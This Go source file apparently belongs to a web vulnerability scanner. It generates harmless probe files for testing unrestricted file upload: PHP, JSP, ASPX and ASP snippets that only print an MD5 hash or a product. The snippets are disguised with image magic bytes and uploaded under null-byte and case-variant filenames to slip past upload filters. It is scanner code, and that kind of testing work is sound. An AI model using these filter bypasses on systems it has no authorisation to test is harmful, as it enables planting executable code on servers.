/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package upload

import (
	"fmt"
	"regexp"
	"strings"
	"wscan/core/utils"
)

type UploadName struct {
	NamesForUpload []string
	NameForCheck   string
}

type Webshell struct {
	FileNameForUpload string
	FileNameForCheck  string
	NamesForUpload    []string
	ContentType       string
	Content           []byte
	CheckPattern      *regexp.Regexp
}

func generateWebshelldata() {

}

func getServiceTypeFromURL() {

}

func GenerateWebshells() (wss []Webshell) {
	randomStr := utils.RandLetters(10)
	randomInt1 := utils.RandInt(1000, 10000)
	randomInt2 := utils.RandInt(1000, 10000)
	// PHP WebShell
	ws := Webshell{
		Content: []byte("\xff\xd8<?php echo md5('{{randomStr}}'); ?>\xff\xd9"),
		NamesForUpload: []string{
			"{{filename}}.php", "{{filename}}.php%00a.jpg", "{{filename}}.PHP", "{{filename}}.php3",
		}}
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomStr}}", randomStr))
	ws.CheckPattern, _ = regexp.Compile(utils.MD5(randomStr))
	wss = append(wss, ws)

	ws = Webshell{
		Content: []byte("GIF89a<?php echo md5('{{randomStr}}'); ?>"),
		NamesForUpload: []string{
			"{{filename}}.php", "{{filename}}.php%00a.gif", "{{filename}}.PHP", "{{filename}}.php3",
		}}
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomStr}}", randomStr))
	ws.CheckPattern, _ = regexp.Compile(utils.MD5(randomStr))
	wss = append(wss, ws)

	ws = Webshell{
		Content: []byte("<?php echo md5('{{randomStr}}'); ?>"),
		NamesForUpload: []string{
			"{{filename}}.php", "{{filename}}.php%00a.txt", "{{filename}}.PHP", "{{filename}}.php3",
		}}
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomStr}}", randomStr))
	ws.CheckPattern, _ = regexp.Compile(utils.MD5(randomStr))
	wss = append(wss, ws)

	// JSP WebShell
	ws = Webshell{
		Content: []byte("<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<%@ page import=\"java.security.MessageDigest\" %>\n<%@ page import=\"com.sun.org.apache.xerces.internal.impl.dv.util.HexBin\" %>\n<%\n    MessageDigest mdAlgorithm = MessageDigest.getInstance(\"md5\");\n    mdAlgorithm.reset();\n    mdAlgorithm.update(\"{{randomStr}}\".getBytes());\n    byte[] digest = mdAlgorithm.digest();\n    out.println(HexBin.encode(digest).toLowerCase());\n%> \n"),
		NamesForUpload: []string{
			"{{filename}}.jsp", "{{filename}}.jsp%00a.txt", "{{filename}}.JSP",
		}}
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomStr}}", randomStr))
	ws.CheckPattern, _ = regexp.Compile(utils.MD5(randomStr))
	wss = append(wss, ws)

	// ASPX WebShell
	ws = Webshell{
		Content: []byte("<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\nprotected void Page_Load(object sender, EventArgs e)\n{\n    encodeStr.Text = System.Web.Security.FormsAuthentication.HashPasswordForStoringInConfigFile(\"{{randomStr}}\", \"MD5\").ToLower();\n}\n</script>\n<html><body><asp:label id=\"encodeStr\" runat=\"server\"></asp:label></body></html>"),
		NamesForUpload: []string{
			"{{filename}}.aspx", "{{filename}}.aspx%00a.txt", "{{filename}}.ASPX",
		}}
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomStr}}", randomStr))
	ws.CheckPattern, _ = regexp.Compile(utils.MD5(randomStr))
	wss = append(wss, ws)

	ws = Webshell{
		Content: []byte("\xff\xd8<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\nprotected void Page_Load(object sender, EventArgs e)\n{\n    encodeStr.Text = System.Web.Security.FormsAuthentication.HashPasswordForStoringInConfigFile(\"{{randomStr}}\", \"MD5\").ToLower();\n}\n</script>\n<html><body><asp:label id=\"encodeStr\" runat=\"server\"></asp:label></body></html>\xff\xd9"),
		NamesForUpload: []string{
			"{{filename}}.aspx", "{{filename}}.aspx%00a.jpg", "{{filename}}.ASPX",
		}}
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomStr}}", randomStr))
	ws.CheckPattern, _ = regexp.Compile(utils.MD5(randomStr))
	wss = append(wss, ws)

	// ASP WebShell
	ws = Webshell{
		Content: []byte("<%\n    a = {{randomInt1}}\n    b = {{randomInt2}}\n    Response.Write(a)\n    Response.Write(a * b)\n    Response.Write(b)\n    %>\n"),
		NamesForUpload: []string{
			"{{filename}}.asp", "{{filename}}.asp%00a.txt",
		}}
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomInt1}}", fmt.Sprintf("%d", randomInt1)))
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomInt2}}", fmt.Sprintf("%d", randomInt2)))
	ws.CheckPattern, _ = regexp.Compile(fmt.Sprintf("%d", randomInt1*randomInt2))
	wss = append(wss, ws)

	ws = Webshell{
		Content: []byte("\xff\xd8<%\n    a = {{randomInt1}}\n    b = {{randomInt2}}\n    Response.Write(a)\n    Response.Write(a * b)\n    Response.Write(b)\n    %>\n\xff\xd9"),
		NamesForUpload: []string{
			"{{filename}}.asp%00a.jpg", "{{filename}}.asp",
		}}
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomInt1}}", fmt.Sprintf("%d", randomInt1)))
	ws.Content = []byte(strings.ReplaceAll(string(ws.Content), "{{randomInt2}}", fmt.Sprintf("%d", randomInt2)))
	ws.CheckPattern, _ = regexp.Compile(fmt.Sprintf("%d", randomInt1*randomInt2))
	wss = append(wss, ws)

	for i := range wss {
		for ii := range wss[i].NamesForUpload {
			filename := utils.RandLetters(8)
			wss[i].NamesForUpload[ii] = strings.ReplaceAll(wss[i].NamesForUpload[ii], "{{filename}}", filename)
		}
	}

	return
}
